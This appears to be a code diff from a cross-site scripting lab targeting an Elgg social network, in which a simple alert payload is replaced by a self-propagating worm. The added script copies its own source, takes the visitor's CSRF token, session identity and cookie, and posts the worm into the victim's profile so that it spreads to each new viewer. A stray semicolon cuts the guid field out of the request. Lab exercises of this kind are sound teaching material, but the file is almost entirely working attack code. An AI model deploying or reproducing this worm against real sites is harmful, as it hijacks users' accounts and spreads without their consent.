@@ -1,12 +1,12 @@
-'use strict';
-
-const CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
-                "&__elgg_ts="+escape(elgg.security.token.__elgg_ts)+
-                "&name="+escape(elgg.session.user.name)+
-                "&description="+escape("<script>alert('I am a worm!!');</script>")+
-                "&guid="+escape(elgg.session.user.guid);
-
-let Ajax = new XMLHttpRequest();
+<script id="worm">
+var CODE = document.getElementById("worm").innerHTML;
+alert(CODE);
+var CONTENT = "__elgg_token="+escape(elgg.security.token.__elgg_token)+
+"&__elgg_ts="+escape(elgg.security.token.__elgg_ts)+
+"&name="+escape(elgg.session.user.name)+
+"&description="+escape("<script>"+CODE+"<\/script>");
+"&guid="+escape(elgg.session.user.guid);
+var Ajax = new XMLHttpRequest();
 Ajax.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
 Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
 Ajax.setRequestHeader("Keep-Alive", "300");
@@ -19,6 +19,7 @@ Ajax.setRequestHeader("Cookie", "Elgg="+escape(document.cookie));
 Ajax.setRequestHeader("Connection", "keep-alive");
 Ajax.setRequestHeader("Upgrade-Insecure-Requests", "1");
 Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
 Ajax.setRequestHeader("Content-Length", CONTENT.length);
 Ajax.send(CONTENT);
+alert('Done');
+</script>
